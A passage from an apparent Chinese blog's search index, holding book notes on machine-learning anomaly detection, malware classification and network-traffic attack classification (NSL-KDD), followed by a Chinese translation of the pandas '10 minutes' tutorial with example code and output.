average，自回归积分移动平均模型)，通过使用正常的数据集，由序列与以前时间点自身之间的相关性（autocorrelation，自相关），来预测接下来的时间段内的状态。在预测相对准确的情况下（预测结果与实际观测到的非异常状态拟合度较高），如果观测值与预测结果之间的差值超过了某个threshold，则认为发生了异常。</li><li>人工神经网络（Particularly，长短期记忆网络（long short-term memory，LSTM））</li><li>注意：预测适合novelty detection（训练集中不包含异常数据），而不适合outlier detection（离群点检测，训练集中包含异常数据）。即适合训练集中没有异常数据，如果训练集包含异常数据的话，容易造成在训练过程中对预测数据的过拟合，从而使观测到的异常状态与预测值之间的差值变小，异常检测效果下降。</li></ul><p>（7）统计度量</p><ul><li>绝对中位差（median absolute deviation，MAD）：去查找一群数据中的离群值，表示为数列中位数的绝对偏差的中位数<br />import numpy as np</li></ul><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> numpy <span class="keyword">as</span> np</span><br><span class="line"><span class="comment"># Input data series</span></span><br><span class="line">x = [<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>, <span class="number">5</span>, <span class="number">6</span>]</span><br><span class="line"><span class="comment"># Calculate median absolute deviation</span></span><br><span class="line">mad = np.median(np.abs(x - np.median(x)))</span><br><span class="line"><span class="comment"># MAD of x is 1.5</span></span><br></pre></td></tr></table></figure><ul><li>Grubbs的离群值检测</li><li>Goodness-of-fit——椭圆包络拟合（Elliptic envelope itting (covariance estimate itting)）</li></ul><p>（8）异常检测方法——无监督学习</p><ul><li>单类支持向量机</li><li>孤立森林<ul><li>随机森林非常适合高维数据的异常检测，适合时间序列数据的实时异常检测</li><li>思想：异常数据和正常数据相比，可以用较少的次数将其与正常数据分隔开</li></ul></li><li>K均值</li></ul><p>（9）异常检测方法——基于密度的方法</p><ul><li>KNN</li><li>局部离群因子（Local outlier factor，LOF）</li></ul><p>（10）入侵检测面临的问题</p><ul><li>错误代价高</li><li>语义鸿沟</li><li>可解释性</li></ul><h1 id="2-恶意软件分析"><a class="markdownIt-Anchor" href="#2-恶意软件分析"></a> 2 恶意软件分析</h1><p>（1）恶意软件类别划分依据：family</p><p>（2）可以用静态签名匹配来判断是否是恶意软件</p><p>（3）使用机器学习进行恶意软件分类的优势</p><ul><li>模糊匹配：给出了两个实体之间的相似程度，而不是简单的yes or no</li><li>自动特征加权和选择</li><li>适应性：适应不断变化的输入，跟踪恶意软件的进化</li></ul><p>（4）使用机器学习进行恶意软件分类的挑战：特征工程</p><p>（5）二进制可执行文件的特征生成：</p><ul><li>静态方法：<ul><li>结构分析：查看程序的文件构成</li><li>静态分析：查看程序的代码</li></ul></li><li>动态分析：运行程序分析（沙箱）<ul><li>调试</li><li>动态插桩：通过挂钩正在运行的进程，并将自定义逻辑注入到应用程序中，从而修改应用程序或环境的运行时行为<br />可用做特征的指标：</li></ul></li></ul><p>（6）程序请求权限</p><ul><li>系统调用</li><li>操作码n-gram（一个包含其它特征的序列）</li><li>网络行为</li><li>logcat</li></ul><p>（7）特征选择：</p><ul><li>单变量分析：迭代地对每个单独特征进行分析，在只考虑该特征的情况下，模型执行会有多好；从而可以得到对特征好坏的评估</li><li>递归特征消除：从完整的特征集开始，分析特征的排除对模型情况的影响</li><li>潜在特征值表示：奇异值分解（SVD）、主成分分析（PCA）</li><li>特定模型中通过特征权重减小或消除某些特征对模型的影响</li></ul><h1 id="3-网络流量分析"><a class="markdownIt-Anchor" href="#3-网络流量分析"></a> 3 网络流量分析</h1><p>（1）无监督特征学习：指的是从原始数据自动生成特征，不同于无监督学习</p><p>（2）TSL/SSL数据包可以被解密</p><p>（3）攻击分为被动攻击和主动攻击</p><ul><li>被动攻击：不会启动与网络中节点的通信，也不会与网络数据交互或修- 改网络数据；而是进行信息收集和侦察活动。</li><li>主动攻击<ul><li>漏洞：用过远程服务器发送的命令，可以使用基于机器学习模糊匹配来检测</li><li>欺骗：DNS欺骗、ARP欺骗</li><li>横向移动</li><li>拒绝服务</li></ul></li></ul><p>（4）C&amp;C服务器控制僵尸网络，C&amp;C服务器的体系结构如下：</p><ul><li>星形/集中式网络</li><li>多重网络：解决了a中的单点故障、可以缓和物理距离带来的问题</li><li>分层网络：为了解决指令必须集中发布的问题</li><li>随机P2P网络：僵尸网络管理员可以向僵尸网络中的任何一个节点发布指令，然后指令在网络中以多点传送的方式进行传播</li></ul><p>（4）使用NSLKDD数据金构建网络攻击分类预测模型</p><ul><li>数据由TCPDump产生有标记的数据集，包含38种攻击类型，只有24种在训练集中出现，攻击属于下面四大类：<ul><li>dos：拒绝服务</li><li>r2l：来自远程服务器的未授权的访问</li><li>u2r：提权尝试</li><li>probe：探测性暴力破解攻击</li></ul></li><li>我们的任务是设计一个通用的分类器，将数据分为五类：4类攻击+良性</li><li>类不平衡问题：训练集中属于r2l和u2l的数据占比非常少，因此在测试集中对这两类数据的分类效果极差，由于训练集中benign数据占比最大，因此这两类数据大部分都被预测为benign数据。</li><li>处理类不平衡的方法：<ul><li>欠采样：在占比较大的数据中进行采样，选取一部分进行使用，而不是用全部的数据集</li><li>过采样：为占比较少的数据类智能合成数据点</li><li>流行的做法是先过采样，再欠采样</li></ul></li></ul>]]></content>
      
      
      <categories>
          
          <category> 安全数据科学 </category>
          
          <category> 读书 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 安全数据科学 </tag>
            
            <tag> 读书 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>十分钟入门Pandas</title>
      <link href="/2020/02/21/%E5%8D%81%E5%88%86%E9%92%9F%E5%85%A5%E9%97%A8Pandas/"/>
      <url>/2020/02/21/%E5%8D%81%E5%88%86%E9%92%9F%E5%85%A5%E9%97%A8Pandas/</url>
      
        <content type="html"><![CDATA[<p>原文：pandas官方文档 <a href="https://pandas.pydata.org/pandas-docs/stable/getting_started/10min.html" target="_blank" rel="noopener">10 minutes to pandas</a></p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> numpy <span class="keyword">as</span> np</span><br><span class="line"><span class="keyword">import</span> pandas <span class="keyword">as</span> pd</span><br><span class="line"><span class="keyword">import</span> matplotlib.pyplot <span class="keyword">as</span> plt</span><br><span class="line">%matplotlib inline</span><br></pre></td></tr></table></figure><h1 id="1-创建对象"><a class="markdownIt-Anchor" href="#1-创建对象"></a> 1 创建对象</h1><h2 id="11-series"><a class="markdownIt-Anchor" href="#11-series"></a> 1.1 Series</h2><ul><li><kbd>Series</kbd>是一个列向量，它仅包含一列数据及其索引，通过向Series中传递一个列表来创建:</li></ul><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">s = pd.Series([<span class="number">1</span>, <span class="number">3</span>, <span class="number">5</span>, np.nan, <span class="number">6</span>, <span class="number">8</span>])</span><br><span class="line"><span class="keyword">print</span> (s)</span><br></pre></td></tr></table></figure><pre><code>0    1.01    3.02    5.03    NaN4    6.05    8.0dtype: float64</code></pre><h2 id="12-dataframe"><a class="markdownIt-Anchor" href="#12-dataframe"></a> 1.2 DataFrame</h2><ul><li><kbd>DataFrame</kbd>是一个矩阵，通过传递一个Numpy数组，以日期作为行索引，以’ABCD’作为列索引来创建：</li></ul><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">dates = pd.date_range(<span class="string">'20191214'</span>, periods=<span class="number">6</span>)</span><br><span class="line">df = pd.DataFrame(np.random.randn(<span class="number">6</span>, <span class="number">4</span>), index=dates, columns=list(<span class="string">'ABCD'</span>))</span><br><span class="line"><span class="keyword">print</span> (df)</span><br></pre></td></tr></table></figure><pre><code>                   A         B         C         D2019-12-14  0.616569  0.051401  1.121409  0.3072672019-12-15  0.483995 -1.251278 -1.772022  1.2826502019-12-16  0.366885 -1.617911  0.438302  1.1241352019-12-17  0.717372  0.233221  1.839167 -1.5357942019-12-18  1.753858  0.266110 -0.333931  0.2813452019-12-19  1.048606  0.984771 -0.279106  0.592285</code></pre><ul><li>通过传递一个字典来创建DataFrame，每个value都会被转化成一个 Series：</li></ul><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">df2 = pd.DataFrame(&#123;<span class="string">'A'</span>: <span class="number">1.</span>,</span><br><span class="line">                    <span class="string">'B'</span>: pd.Timestamp(<span class="string">'20130102'</span>),</span><br><span class="line">                    <span class="string">'C'</span>: pd.Series(<span class="number">1</span>, index=list(range(<span class="number">4</span>)), dtype=<span class="string">'float32'</span>),</span><br><span class="line">                    <span class="string">'D'</span>: np.array([<span class="number">3</span>] * <span class="number">4</span>, dtype=<span class="string">'int32'</span>),</span><br><span class="line">                    <span class="string">'E'</span>: pd.Categorical([<span class="string">"test"</span>, <span class="string">"train"</span>, <span class="string">"test"</span>, <span class="string">"train"</span>]),</span><br><span class="line">                    <span class="string">'F'</span>: <span class="string">'foo'</span>&#125;)</span><br><span class="line"><span class="keyword">print</span> (df2)</span><br></pre></td></tr></table></figure><pre><code>     A          B    C  D      E    F0  1.0 2013-01-02  1.0  3   test  foo1  1.0 2013-01-02  1.0  3  train  foo2  1.0 2013-01-02  1.0  3   test  foo3  1.0 2013-01-02  1.0  3  train  foo</code></pre><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#DataFrame每一列的数据类型都不同:</span></span><br><span class="line"><span class="keyword">print</span> (df2.dtypes)</span><br></pre></td></tr></table></figure><pre><code>A           float64B    datetime64[ns]C           float32D             int32E          categoryF            objectdtype: object</code></pre><ul><li>所以我们可以认为，<kbd>DataFrame</kbd>是由一列一列的<kbd>Series</kbd>拼成的</li></ul><h1 id="2-查看数据"><a class="markdownIt-Anchor" href="#2-查看数据"></a> 2 查看数据</h1><p>用<kbd>head</kbd>和<kbd>tail</kbd>查看开始和结尾几行的数据，用<kbd>index</kbd>和<kbd>columns</kbd>查看行索引和列索引，用<kbd>vlaues</kbd>显示不带索引的内容：</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">print</span> (df.head(), <span class="string">'\n'</span>)</span><br><span class="line"><span class="keyword">print</span> (df.tail(<span class="number">3</span>), <span class="string">'\n'</span>)</span><br><span class="line"><span class="keyword">print</span> (df.index, <span class="string">'\n'</span>)</span><br><span class="line"><span class="keyword">print</span> (df.columns, <span class="string">'\n'</span>)</span><br><span class="line"><span class="keyword">print</span> (df.values, <span class="string">'\n'</span>)</span><br></pre></td></tr></table></figure><pre><code>                   A         B         C         D2019-12-14  0.616569  0.051401  1.121409  0.3072672019-12-15  0.483995 -1.251278 -1.772022  1.2826502019-12-16  0.366885 -1.617911  0.438302  1.1241352019-12-17  0.717372  0.233221  1.839167 -1.5357942019-12-18  1.753858  0.266110 -0.333931  0.281345                    A         B         C         D2019-12-17  0.717372  0.233221  1.839167 -1.5357942019-12-18  1.753858  0.266110 -0.333931  0.2813452019-12-19  1.048606  0.984771 -0.279106  0.592285 DatetimeIndex(['2019-12-14', '2019-12-15', '2019-12-16', '2019-12-17',               '2019-12-18', '2019-12-19'],              dtype='datetime64[ns]', freq='D') Index(['A', 'B', 'C', 'D'], dtype='object') [[ 0.61656893  0.05140077  1.12140918  0.30726721] [ 0.48399521 -1.25127827 -1.77202211  1.2826497 ] [ 0.36688539 -1.61791122  0.43830175  1.12413452] [ 0.71737246  0.23322127  1.83916745 -1.53579412] [ 1.75385779  0.26611012 -0.33393125  0.281345  ] [ 1.04860622  0.98477115 -0.27910636  0.59228493]] </code></pre><p>​</p><ul><li>Numpy arrays整个数组只有一个数据类型，而DataFrame每一列一个数据类型。所以在将df2转化为numpy的时候，每列的数据类型统一为object:</li></ul><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">print</span> (df.to_numpy())</span><br><span class="line">df2.to_numpy()</span><br></pre></td></tr></table></figure><pre><code>[[ 0.61656893  0.05140077  1.12140918  0.30726721] [ 0.48399521 -1.25127827 -1.77202211  1.2826497 ] [ 0.36688539 -1.61791122  0.43830175  1.12413452] [ 0.71737246  0.23322127  1.83916745 -1.53579412] [ 1.75385779  0.26611012 -0.33393125  0.281345  ] [ 1.04860622  0.98477115 -0.27910636  0.59228493]]array([[1.0, Timestamp('2013-01-02 00:00:00'), 1.0, 3, 'test', 'foo'],       [1.0, Timestamp('2013-01-02 00:00:00'), 1.0, 3, 'train', 'foo'],       [1.0, Timestamp('2013-01-02 00:00:00'), 1.0, 3, 'test', 'foo'],       [1.0, Timestamp('2013-01-02 00:00:00'), 1.0, 3, 'train', 'foo']],      dtype=object)</code></pre><ul><li>&lt;kbdDescribe</kbd>显示每一列数据的统计概要:</li></ul><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">print(df.describe())</span><br></pre></td></tr></table></figure><pre><code>              A         B         C         Dcount  6.000000  6.000000  6.000000  6.000000mean   0.831214 -0.222281  0.168970  0.341981std    0.508670  0.998449  1.264150  1.008979min    0.366885 -1.617911 -1.772022 -1.53579425%    0.517139 -0.925609 -0.320225  0.28782650%    0.666971  0.142311  0.079598  0.44977675%    0.965798  0.257888  0.950632  0.991172max    1.753858  0.984771  1.839167  1.282650</code></pre><ul><li><kbd>T</kbd>表示矩阵的转置：</li></ul><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">print</span> (df.T)</span><br></pre></td></tr></table></figure><pre><code>   2019-12-14  2019-12-15  2019-12-16  2019-12-17  2019-12-18  2019-12-19A    0.616569    0.483995    0.366885    0.717372    1.753858    1.048606B    0.051401   -1.251278   -1.617911    0.233221    0.266110    0.984771C    1.121409   -1.772022    0.438302    1.839167   -0.333931   -0.279106D    0.307267    1.282650    1.124135   -1.535794    0.281345    0.592285</code></pre><ul><li><kbd>sort_index</kbd>按照轴排序，axis=1表示第二个维度，即按照列索引排序：</li></ul><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">print</span> (df.sort_index(axis=<span class="number">1</span>, ascending=<span class="literal">False</span>))</span><br></pre></td></tr></table></figure><pre><code>                   D         C         B         A2019-12-14  0.307267  1.121409  0.051401  0.6165692019-12-15  1.282650 -1.772022 -1.251278  0.4839952019-12-16  1.124135  0.438302 -1.617911  0.3668852019-12-17 -1.535794  1.839167  0.233221  0.7173722019-12-18  0.281345 -0.333931  0.266110  1.7538582019-12-19  0.592285 -0.279106  0.984771  1.048606</code></pre><ul><li><kbd>sort_values</kbd>按照值排序，by='B’表示对第二列排序：</li></ul><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">print</span> (df.sort_values(by=<span class="string">'B'</span>))</span><br></pre></td></tr></table></figure><pre><code>                   A         B         C         D2019-12-16  0.366885 -1.617911  0.438302  1.1241352019-12-15  0.483995 -1.251278 -1.772022  1.2826502019-12-14  0.616569  0.051401  1.121409  0.3072672019-12-17  0.717372  0.233221  1.839167 -1.5357942019-12-18  1.753858  0.266110 -0.333931  0.2813452019-12-19  1.048606  0.984771 -0.279106  0.592285</code></pre><h1 id="3-选择"><a class="markdownIt-Anchor" href="#3-选择"></a> 3 选择</h1><h2 id="31-获取行-列"><a class="markdownIt-Anchor" href="#31-获取行-列"></a> 3.1 获取行、列</h2><ul><li>与numpy类似，DataFrame也可以用<kbd>[]</kbd>进行选择：</li></ul><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">print</span> (df[<span class="string">'A'</span>], <span class="string">'\n'</span>)</span><br><span class="line"><span class="keyword">print</span> (df[<span class="number">0</span>:<span class="number">3</span>], <span class="string">'\n'</span>)  <span class="comment">#行切片</span></span><br><span class="line"><span class="keyword">print</span> (df[<span class="string">'20191216'</span>:<span class="string">'20191219'</span>], <span class="string">'\n'</span>)</span><br></pre></td></tr></table></figure><pre><code>2019-12-14    0.6165692019-12-15    0.4839952019-12-16    0.3668852019-12-17    0.7173722019-12-18    1.7538582019-12-19    1.048606Freq: D, Name: A, dtype: float64                    A         B         C         D2019-12-14  0.616569  0.051401  1.121409  0.3072672019-12-15  0.483995 -1.251278 -1.772022  1.2826502019-12-16  0.366885 -1.617911  0.438302  1.124135                    A         B         C         D2019-12-16  0.366885 -1.617911  0.438302  1.1241352019-12-17  0.717372  0.233221  1.839167 -1.5357942019-12-18  1.753858  0.266110 -0.333931  0.2813452019-12-19  1.048606  0.984771 -0.279106  0.592285 </code></pre><p>​</p><ul><li>通过<kbd>label</kbd>进行选择</li></ul><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">print</span> (df.loc[dates[<span class="number">0</span>]], <span class="string">'\n'</span>) </span><br><span class="line"><span class="keyword">print</span> (df.loc[:, [<span class="string">'A'</span>, <span class="string">'B'</span>]], <span class="string">'\n'</span>)</span><br><span class="line"><span class="keyword">print</span> (df.loc[<span class="string">'20191216'</span>:<span class="string">'20191218'</span>, [<span class="string">'A'</span>, <span class="string">'B'</span>]], <span class="string">'\n'</span>)</span><br><span class="line"><span class="keyword">print</span> (df.at[dates[<span class="number">0</span>], <span class="string">'A'</span>], <span class="string">'\n'</span>)  <span class="comment">#选择单个数据时用at，速度更快</span></span><br></pre></td></tr></table></figure><pre><code>A    0.616569B    0.051401C    1.121409D    0.307267Name: 2019-12-14 00:00:00, dtype: float64                    A         B2019-12-14  0.616569  0.0514012019-12-15  0.483995 -1.2512782019-12-16  0.366885 -1.6179112019-12-17  0.717372  0.2332212019-12-18  1.753858  0.2661102019-12-19  1.048606  0.984771                    A         B2019-12-16  0.366885 -1.6179112019-12-17  0.717372  0.2332212019-12-18  1.753858  0.266110 0.6165689271991402 </code></pre><p>​</p><ul><li>通过<kbd>整数下标</kbd>进行选择</li></ul><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">print</span> (df.iloc[<span class="number">3</span>], <span class="string">'\n'</span>)</span><br><span class="line"><span class="keyword">print</span> (df.iloc[<span class="number">3</span>:<span class="number">5</span>, <span class="number">0</span>:<span class="number">2</span>], <span class="string">'\n'</span>)</span><br><span class="line"><span class="keyword">print</span> (df.iloc[[<span class="number">1</span>,<span class="number">2</span>,<span class="number">4</span>], [<span class="number">0</span>,<span class="number">2</span>]], <span class="string">'\n'</span>)</span><br><span class="line"><span class="keyword">print</span> (df.iloc[<span class="number">1</span>:<span class="number">3</span>, :], <span class="string">'\n'</span>)</span><br><span class="line"><span class="keyword">print</span> (df.iat[<span class="number">1</span>,<span class="number">1</span>], <span class="string">'\n'</span>)</span><br></pre></td></tr></table></figure><pre><code>A    0.717372B    0.233221C    1.839167D   -1.535794Name: 2019-12-17 00:00:00, dtype: float64                    A         B2019-12-17  0.717372  0.2332212019-12-18  1.753858  0.266110                    A         C2019-12-15  0.483995 -1.7720222019-12-16  0.366885  0.4383022019-12-18  1.753858 -0.333931                    A         B         C         D2019-12-15  0.483995 -1.251278 -1.772022  1.2826502019-12-16  0.366885 -1.617911  0.438302  1.124135 -1.2512782747247186 </code></pre><p>​</p><ul><li>通过<kbd>布尔值下标</kbd>进行选择</li></ul><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">print</span> (df[df.A &gt; <span class="number">0</span>], <span class="string">'\n'</span>)    <span class="comment">#可以用df.A来表示</span></span><br><span class="line"><span class="keyword">print</span> (df[df &gt; <span class="number">0</span>], <span class="string">'\n'</span>)</span><br><span class="line">df2 = df.copy()</span><br><span class="line">df2[<span class="string">'E'</span>] = [<span class="string">'one'</span>, <span class="string">'one'</span>, <span class="string">'two'</span>, <span class="string">'three'</span>, <span class="string">'four'</span>, <span class="string">'three'</span>]</span><br><span class="line"><span class="keyword">print</span> (df2, <span class="string">'\n'</span>)</span><br><span class="line"><span class="keyword">print</span> (df2[df2[<span class="string">'E'</span>].isin([<span class="string">'two'</span>, <span class="string">'four'</span>])])  <span class="comment">#用isin来过滤</span></span><br></pre></td></tr></table></figure><pre><code>                   A         B         C         D2019-12-14  0.616569  0.051401  1.121409  0.3072672019-12-15  0.483995 -1.251278 -1.772022  1.2826502019-12-16  0.366885 -1.617911  0.438302  1.1241352019-12-17  0.717372  0.233221  1.839167 -1.5357942019-12-18  1.753858  0.266110 -0.333931  0.2813452019-12-19  1.048606  0.984771 -0.279106  0.592285                    A         B         C         D2019-12-14  0.616569  0.051401  1.121409  0.3072672019-12-15  0.483995       NaN       NaN  1.2826502019-12-16  0.366885       NaN  0.438302  1.1241352019-12-17  0.717372  0.233221  1.839167       NaN2019-12-18  1.753858  0.266110       NaN  0.2813452019-12-19  1.048606  0.984771       NaN  0.592285                    A         B         C         D      E2019-12-14  0.616569  0.051401  1.121409  0.307267    one2019-12-15  0.483995 -1.251278 -1.772022  1.282650    one2019-12-16  0.366885 -1.617911  0.438302  1.124135    two2019-12-17  0.717372  0.233221  1.839167 -1.535794  three2019-12-18  1.753858  0.266110 -0.333931  0.281345   four2019-12-19  1.048606  0.984771 -0.279106  0.592285  three                    A         B         C         D     E2019-12-16  0.366885 -1.617911  0.438302  1.124135   two2019-12-18  1.753858  0.266110 -0.333931  0.281345  four</code></pre><h2 id="32-设置行-列"><a class="markdownIt-Anchor" href="#32-设置行-列"></a> 3.2 设置行、列</h2><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">s1 = pd.Series([<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>, <span class="number">5</span>, <span class="number">6</span>], index=pd.date_range(<span class="string">'20191215'</span>, periods=<span class="number">6</span>))</span><br><span class="line"><span class="keyword">print</span> (s1, <span class="string">'\n'</span>)</span><br><span class="line"></span><br><span class="line">df[<span class="string">'F'</span>] = s1</span><br><span class="line">df.at[dates[<span class="number">0</span>], <span class="string">'A'</span>] = <span class="number">0</span></span><br><span class="line">df.iat[<span class="number">0</span>, <span class="number">1</span>] = <span class="number">0</span></span><br><span class="line">df.loc[:, <span class="string">'D'</span>] = np.array([<span class="number">5</span>] * len(df))</span><br><span class="line"><span class="keyword">print</span> (df)</span><br><span class="line"></span><br><span class="line">df2 = df.copy()</span><br><span class="line">df2[df2 &gt; <span class="number">0</span>] = -df2</span><br><span class="line"><span class="keyword">print</span> (df2)</span><br></pre></td></tr></table></figure><pre><code>2019-12-15    12019-12-16    22019-12-17    32019-12-18    42019-12-19    52019-12-20    6Freq: D, dtype: int64                    A         B         C  D    F2019-12-14  0.000000  0.000000  1.121409  5  NaN2019-12-15  0.483995 -1.251278 -1.772022  5  1.02019-12-16  0.366885 -1.617911  0.438302  5  2.02019-12-17  0.717372  0.233221  1.839167  5  3.02019-12-18  1.753858  0.266110 -0.333931  5  4.02019-12-19  1.048606  0.984771 -0.279106  5  5.0                   A         B         C  D    F2019-12-14  0.000000  0.000000 -1.121409 -5  NaN2019-12-15 -0.483995 -1.251278 -1.772022 -5 -1.02019-12-16 -0.366885 -1.617911 -0.438302 -5 -2.02019-12-17 -0.717372 -0.233221 -1.839167 -5 -3.02019-12-18 -1.753858 -0.266110 -0.333931 -5 -4.02019-12-19 -1.048606 -0.984771 -0.279106 -5 -5.0</code></pre><h1 id="4-缺失值"><a class="markdownIt-Anchor" href="#4-缺失值"></a> 4 缺失值</h1><ul><li>pandas用<kbd>np.nan</kbd>表示缺失值，通常它不会被计算。</li></ul><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">df1 = df.reindex(index=dates[<span class="number">0</span>:<span class="number">4</span>], columns=list(df.columns) + [<span class="string">'E'</span>])</span><br><span class="line">df1.loc[dates[<span class="number">0</span>]:dates[<span class="number">1</span>], <span class="string">'E'</span>] = <span class="number">1</span></span><br><span class="line"><span class="keyword">print</span> (df1, <span class="string">'\n'</span>)</span><br><span class="line"><span class="keyword">print</span> (df1.dropna(how=<span class="string">'any'</span>), <span class="string">'\n'</span>)  <span class="comment">#删除所有存在缺失值的行</span></span><br><span class="line"><span class="keyword">print</span> (df1.fillna(value=<span class="number">5</span>), <span class="string">'\n'</span>)  <span class="comment">#将所有缺失值用5填充</span></span><br><span class="line"><span class="keyword">print</span> (pd.isna(df1))  <span class="comment">#获取所有位置是否是缺失值的boolean值</span></span><br></pre></td></tr></table></figure><pre><code>                   A         B         C  D    F    E2019-12-14  0.000000  0.000000  1.121409  5  NaN  1.02019-12-15  0.483995 -1.251278 -1.772022  5  1.0  1.02019-12-16  0.366885 -1.617911  0.438302  5  2.0  NaN2019-12-17  0.717372  0.233221  1.839167  5  3.0  NaN                    A         B         C  D    F    E2019-12-15  0.483995 -1.251278 -1.772022  5  1.0  1.0                    A         B         C  D    F    E2019-12-14  0.000000  0.000000  1.121409  5  5.0  1.02019-12-15  0.483995 -1.251278 -1.772022  5  1.0  1.02019-12-16  0.366885 -1.617911  0.438302  5  2.0  5.02019-12-17  0.717372  0.233221  1.839167  5  3.0  5.0                 A      B      C      D      F      E2019-12-14  False  False  False  False   True  False2019-12-15  False  False  False  False  False  False2019-12-16  False  False  False  False  False   True2019-12-17  False  False  False  False  False   True</code></pre><h1 id="4-操作"><a class="markdownIt-Anchor" href="#4-操作"></a> 4 操作</h1><h2 id="41-统计"><a class="markdownIt-Anchor" href="#41-统计"></a> 4.1 统计</h2><ul><li>通常，操作都会把 NaN 排除在外</li></ul><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">print</span> (df.mean(), <span class="string">'\n'</span>)</span><br><span class="line"><span class="keyword">print</span> (df.mean(<span class="number">1</span>),<span class="string">'\n'</span>)  <span class="comment">#对列求均值</span></span><br><span class="line"><span class="keyword">print</span> (pd.Series([<span class="number">1</span>, <span class="number">3</span>, <span class="number">5</span>, np.nan, <span class="number">6</span>, <span class="number">8</span>], index=dates).shift(<span class="number">2</span>), <span class="string">'\n'</span>)  <span class="comment">#将所有数据下移两位</span></span><br></pre></td></tr></table></figure><pre><code>A    0.728453B   -0.230848C    0.168970D    5.000000F    3.000000dtype: float64 2019-12-14    1.5303522019-12-15    0.6921392019-12-16    1.2374552019-12-17    2.1579522019-12-18    2.1372072019-12-19    2.350854Freq: D, dtype: float64 2019-12-14    NaN2019-12-15    NaN2019-12-16    1.02019-12-17    3.02019-12-18    5.02019-12-19    NaNFreq: D, dtype: float64 </code></pre><p>​</p><h2 id="42-apply"><a class="markdownIt-Anchor" href="#42-apply"></a> 4.2 Apply</h2><ul><li>对数据apply一个函数</li></ul><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">print</span> (df, <span class="string">'\n'</span>)</span><br><span class="line"><span class="keyword">print</span> (df.apply(np.cumsum), <span class="string">'\n'</span>) <span class="comment">#cumsum表示每行逐次累加</span></span><br><span class="line"><span class="keyword">print</span> (df.apply(<span class="keyword">lambda</span> x: x.max()-x.min()))  <span class="comment">#每一列的最大值减去最小值</span></span><br></pre></td></tr></table></figure><pre><code>                   A         B         C  D    F2019-12-14  0.000000  0.000000  1.121409  5  NaN2019-12-15  0.483995 -1.251278 -1.772022  5  1.02019-12-16  0.366885 -1.617911  0.438302  5  2.02019-12-17  0.717372  0.233221  1.839167  5  3.02019-12-18  1.753858  0.266110 -0.333931  5  4.02019-12-19  1.048606  0.984771 -0.279106  5  5.0                    A         B         C   D     F2019-12-14  0.000000  0.000000  1.121409   5   NaN2019-12-15  0.483995 -1.251278 -0.650613  10   1.02019-12-16  0.850881 -2.869189 -0.212311  15   3.02019-12-17  1.568253 -2.635968  1.626856  20   6.02019-12-18  3.322111 -2.369858  1.292925  25  10.02019-12-19  4.370717 -1.385087  1.013819  30  15.0 A    1.753858B    2.602682C    3.611190D    0.000000F    4.000000dtype: float64</code></pre><h2 id="43-直方图"><a class="markdownIt-Anchor" href="#43-直方图"></a> 4.3 直方图</h2><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">s = pd.Series(np.random.randint(<span class="number">0</span>, <span class="number">7</span>, size=<span class="number">10</span>))</span><br><span class="line"><span class="keyword">print</span> (s, <span class="string">'\n'</span>)</span><br><span class="line"><span class="keyword">print</span> (s.value_counts())</span><br></pre></td></tr></table></figure><pre><code>0    41    32    33    64    45    56    27    28    39    0dtype: int32 3    34    22    26    15    10    1dtype: int64</code></pre><h2 id="44-字符串函数"><a class="markdownIt-Anchor" href="#44-字符串函数"></a> 4.4 字符串函数</h2><ul><li>Series在<kbd>str</kbd>属性中自带了很多字符串函数：</li></ul><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">s = pd.Series([<span class="string">'A'</span>, <span class="string">'B'</span>, <span class="string">'C'</span>, <span class="string">'Aaba'</span>, <span class="string">'Baca'</span>, np.nan, <span class="string">'CABA'</span>, <span class="string">'dog'</span>, <span class="string">'cat'</span>])</span><br><span class="line"><span class="keyword">print</span> (s.str.lower(), <span class="string">'\n'</span>)</span><br></pre></td></tr></table></figure><pre><code>0       a1       b2       c3    aaba4    baca5     NaN6    caba7     dog8     catdtype: object </code></pre><p>​</p><h1 id="5-合并"><a class="markdownIt-Anchor" href="#5-合并"></a> 5 合并</h1><h2 id="51-concat"><a class="markdownIt-Anchor" href="#51-concat"></a> 5.1 Concat</h2><ul><li>简单地按行拼接</li></ul><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">df = pd.DataFrame(np.random.randn(<span class="number">10</span>, <span class="number">4</span>))</span><br><span class="line"><span class="keyword">print</span> (df, <span class="string">'\n'</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#break it into pieces</span></span><br><span class="line">pieces = [df[:<span class="number">3</span>], df[<span class="number">3</span>:<span class="number">7</span>], df[<span class="number">7</span>:]]</span><br><span class="line"></span><br><span class="line"><span class="keyword">print</span> (pd.concat(pieces))</span><br></pre></td></tr></table></figure><pre><code>          0         1         2         30  1.434680 -0.776149 -1.218836  2.3971181 -1.632868 -0.806080  0.634619 -0.7609582  1.028005 -0.020240  0.696301  0.0906923 -1.516807  0.952234  0.758215 -0.2724094  0.540413  0.258468 -0.563238 -1.3808255  0.021616  0.097505 -1.052843  0.2728926 -0.957512  0.088345 -0.972309 -1.2245227  0.211805  1.674883 -0.919839 -0.1598928  1.651509  0.908129 -0.416815 -0.6290149 